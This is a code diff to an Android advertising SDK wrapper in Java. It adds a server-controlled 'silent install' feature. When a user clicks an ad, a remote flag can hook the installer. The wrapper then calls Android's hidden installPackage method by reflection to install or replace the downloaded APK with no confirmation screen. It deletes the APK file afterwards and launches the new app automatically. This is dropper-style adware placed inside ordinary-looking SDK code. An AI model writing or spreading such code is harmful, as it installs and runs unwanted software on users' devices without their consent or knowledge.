@@ -1,12 +1,20 @@
 package com.fighter.wrapper;
 
+import android.Manifest;
 import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
+import android.content.pm.IPackageInstallObserver;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.RemoteException;
 import android.text.TextUtils;
 import android.util.ArrayMap;
 import android.util.LruCache;
 import android.view.View;
 
+import com.ak.android.appIntegration.HookInstaller;
 import com.ak.android.engine.download.ApkListener;
 import com.ak.android.engine.nav.NativeAd;
 import com.ak.android.engine.nav.NativeAdLoaderListener;
@@ -14,6 +22,7 @@ import com.ak.android.engine.navbase.AdSpace;
 import com.ak.android.engine.navbase.NativeAdLoader;
 import com.ak.android.engine.navvideo.NativeVideoAd;
 import com.ak.android.engine.navvideo.NativeVideoAdLoaderListener;
+import com.ak.android.other.news.DownloadUtil;
 import com.ak.android.shell.AKAD;
 import com.alibaba.fastjson.JSONObject;
 import com.fighter.ContextProxy;
@@ -26,7 +35,11 @@ import com.fighter.common.utils.ThreadPoolUtils;
 import com.fighter.config.ReaperConfig;
 import com.fighter.download.ReaperEnv;
 
+import java.io.File;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Map;
@@ -39,14 +52,13 @@ public class AKAdSDKWrapper extends ISDKWrapper {
 
     public static final String PARAMS_KEY_VIEW = "view";
     public static final String PARAMS_KEY_ACTIVITY = "activity";
-
     // ----------------------------------------------------
 
     private static final String EVENT_POSITION = "position";
 
     // ----------------------------------------------------
 
-    private static final String AK_AD_API_VER = "3.8.3031_0302";
+    private static final String AK_AD_API_VER = "4.0.3038_0725";
 
     private static final String EXTRA_EVENT_NATIVE_AD = "akad_event_native_ad";
     private static final String EXTRA_EVENT_NATIVE_VIDEO_AD = "akad_event_native_video_ad";
@@ -64,9 +76,11 @@ public class AKAdSDKWrapper extends ISDKWrapper {
     // ----------------------------------------------------
 
     private Context mContext;
+    private PackageManager mPackageManager;
     private ThreadPoolUtils mThreadPoolUtils = AdThreadPool.INSTANCE.getThreadPoolUtils();
     private DownloadCallback mDownloadCallback;
     private LruCache<String, AdInfo> mDownloadMap;
+    private HashMap<String, AppInfo> mDownloadApk;//以包名为key，聚效返回的key,path封装AppInfo为value，安装成功后回传
 
     // ----------------------------------------------------
 
@@ -85,10 +99,13 @@ public class AKAdSDKWrapper extends ISDKWrapper {
         ReaperEnv.sContextProxy = new ContextProxy(appContext);
         mContext = ReaperEnv.sContextProxy;
         mDownloadMap = new LruCache<>(200);
+        mDownloadApk = new HashMap<>();
         //if second param set true should see "AKAD" tag
         ReaperLog.i(TAG, "[init] in AKAd " + mContext.getPackageName());
         AKAD.initSdk(mContext, ReaperConfig.TEST_MODE, ReaperConfig.TEST_MODE);
-        AKAD.setApkListener(mContext, new ApkDownloadListener());
+        ApkDownloadListener apkDownloadListener = new ApkDownloadListener();
+        AKAD.setApkListener(mContext, apkDownloadListener);
+        HookInstaller.setSilentListener(apkDownloadListener);
     }
 
     @Override
@@ -123,9 +140,9 @@ public class AKAdSDKWrapper extends ISDKWrapper {
                 "\nAdInfo " + adInfo);
         Map<String, Object> eventParams = adInfo.getAdAllParams();
         NativeAd nativeAd = null;
-        if(adInfo.getContentType() == AdInfo.ContentType.VIDEO) {
+        if (adInfo.getContentType() == AdInfo.ContentType.VIDEO) {
             Object videoAd = adInfo.getExtra(EXTRA_EVENT_NATIVE_VIDEO_AD);
-            if(videoAd instanceof NativeVideoAd) nativeAd = (NativeAd) videoAd;
+            if (videoAd instanceof NativeVideoAd) nativeAd = (NativeAd) videoAd;
         } else {
             nativeAd = (NativeAd) adInfo.getExtra(EXTRA_EVENT_NATIVE_AD);
         }
@@ -163,7 +180,7 @@ public class AKAdSDKWrapper extends ISDKWrapper {
                     int status = VIDEO_STATUS_MAP.get(adEvent);
                     ReaperLog.i("ForTest", " video status comment START = 81,PAUSE = 82,CONTINUE = 83,EXIT = 84,COMPLETE = 85");
                     ReaperLog.i("ForTest", "srcName: " + adInfo.getExtra("adName") + " posId: " + adInfo.getAdPosId() + " localPosId: " + adInfo.getExtra("adLocalPosId")
-                            + " uuid: " + adInfo.getUUID().substring(30) + " status " + status );
+                            + " uuid: " + adInfo.getUUID().substring(30) + " status " + status);
                     eventAdVideoChanged((NativeVideoAd) nativeAd,
                             status,
                             position);
@@ -192,6 +209,8 @@ public class AKAdSDKWrapper extends ISDKWrapper {
             String key = json.optString("key");
             if (!TextUtils.isEmpty(key)) {
                 mDownloadMap.put(key, adInfo);
+                //根据服务器的静默安装标记位，决定是否Hook
+                HookInstaller.setHookInstall(adInfo.getSilentInstall());
             }
         }
         nativeAd.onAdClick(activity, v);
@@ -215,6 +234,12 @@ public class AKAdSDKWrapper extends ISDKWrapper {
         AdInfo adInfo = mDownloadMap.get(key);
         if (mDownloadCallback != null && adInfo != null) {
             mDownloadCallback.onDownloadEvent(adInfo, adEvent);
+        }
+    }
+
+    private void notifySilentInstallFailed(String key, String apkPath, String packageName) {
+        if (mDownloadCallback != null) {
+            mDownloadCallback.onSilentInstallFailed(key, apkPath, packageName);
         }
     }
 
@@ -425,6 +450,7 @@ public class AKAdSDKWrapper extends ISDKWrapper {
                     adInfo = new AdInfo();
                     adInfo.generateUUID();
                     adInfo.setExpireTime(mAdRequest.getExpireTime());
+                    adInfo.setSilentInstall(mAdRequest.getSilentInstall());
                     adInfo.setCanCache(false);
                     adInfo.setAdName(SdkName.AKAD);
                     adInfo.setAdPosId(mAdRequest.getAdPosId());
@@ -532,6 +558,7 @@ public class AKAdSDKWrapper extends ISDKWrapper {
                     adInfo = new AdInfo();
                     adInfo.generateUUID();
                     adInfo.setExpireTime(mAdRequest.getExpireTime());
+                    adInfo.setSilentInstall(mAdRequest.getSilentInstall());
                     adInfo.setCanCache(true);
                     adInfo.setAdName(SdkName.AKAD);
                     adInfo.setAdPosId(mAdRequest.getAdPosId());
@@ -599,7 +626,7 @@ public class AKAdSDKWrapper extends ISDKWrapper {
         }
     }
 
-    private class ApkDownloadListener implements ApkListener {
+    private class ApkDownloadListener implements ApkListener, HookInstaller.AKAdSilentInstallCallBack {
 
         @Override
         public void onApkDownloadStart(String s) {
@@ -639,6 +666,103 @@ public class AKAdSDKWrapper extends ISDKWrapper {
         @Override
         public void onApkInstallCompleted(String s, String s1) {
             notifyDownloadCallback(s, AdEvent.EVENT_APP_INSTALL);
+        }
+
+        @Override
+        public void installInternal(String key, String apkPath) {
+            ReaperLog.i(TAG, " start install internal key " + key + " apkPath " + apkPath);
+            File apkFile = new File(apkPath);
+            if (!apkFile.exists()) {
+                ReaperLog.e(TAG, " install internal apk file not exits");
+                return;
+            }
+            Uri apkURI = Uri.fromFile(apkFile);
+            PackageManager packageManager = mContext.getPackageManager();
+            PackageInfo packageInfo = packageManager.getPackageArchiveInfo(apkPath, PackageManager.GET_ACTIVITIES);
+            if (packageInfo == null) {
+                ReaperLog.e(TAG, " silent install apk file is invalid ");
+                return;
+            }
+            mDownloadApk.put(packageInfo.packageName, new AppInfo(key, apkPath));
+            int permission = mContext.checkSelfPermission(Manifest.permission.INSTALL_PACKAGES);
+            ReaperLog.i(TAG, " package name " + mContext.getPackageName()
+                    + " permission is " + permission
+                    + " 0 granted -1 denied");
+            if (permission == PackageManager.PERMISSION_GRANTED) {
+                startSilentInstall(key, apkPath, apkURI, packageInfo);
+            } else {
+                notifySilentInstallFailed(key, apkPath, packageInfo.packageName);
+            }
+        }
+
+        /**
+         * 开始静默安装应用
+         *
+         * @param key
+         * @param apkPath
+         * @param apkURI
+         * @param packageInfo
+         */
+        private void startSilentInstall(String key, String apkPath, Uri apkURI, PackageInfo packageInfo) {
+            if (mPackageManager == null)
+                mPackageManager = mContext.getPackageManager();
+            int installFlags = 0;
+            try {
+                installFlags |= 0x00000002; /*PackageManager.INSTALL_REPLACE_EXISTING*/
+                Method installPackage = mPackageManager.getClass().getMethod("installPackage",
+                        Uri.class, IPackageInstallObserver.class, int.class, String.class);
+                installPackage.invoke(mPackageManager, apkURI,
+                        new InstallObserver(), installFlags, mContext.getPackageName());
+            } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
+                AppInfo remove = mDownloadApk.remove(packageInfo.packageName);
+                ReaperLog.e(TAG, "silent install package " + packageInfo.packageName
+                        + " has exception " + e.toString()
+                        + " and remove in map " + remove + " will call package installer");
+                notifySilentInstallFailed(key, apkPath, packageInfo.packageName);
+                e.printStackTrace();
+            }
+        }
+    }
+
+    class InstallObserver extends IPackageInstallObserver.Stub {
+
+        @Override
+        public void packageInstalled(String packageName, int returnCode) throws RemoteException {
+            ReaperLog.i(TAG, "silent install package " + packageName
+                    + " return code " + returnCode);
+            if (!mDownloadApk.containsKey(packageName)) {
+                ReaperLog.e(TAG, packageName + " not recorded into map");
+            } else {
+                AppInfo appInfo = mDownloadApk.get(packageName);
+                DownloadUtil.onApkActived(mContext, appInfo.key);
+                File apkFile = new File(appInfo.path);
+                if (apkFile.exists()) {
+                    boolean delete = apkFile.delete();
+                    ReaperLog.i(TAG, delete + " delete apk file " + appInfo.path);
+                }
+            }
+            ReaperLog.i(TAG, "package installed " + packageName);
+            Intent appIntent = mPackageManager.getLaunchIntentForPackage(packageName);
+            mContext.startActivity(appIntent);
+            mDownloadApk.remove(packageName);//delete key
+        }
+    }
+
+    /**
+     * 从HookInstaller返回的key和path封装的对象
+     */
+    class AppInfo {
+        public String key;
+        public String path;
+
+        public AppInfo(String key, String path) {
+            this.key = key;
+            this.path = path;
+        }
+
+        @Override
+        public String toString() {
+            return "AKAd info key " + key + " path " + path;
         }
     }
 }
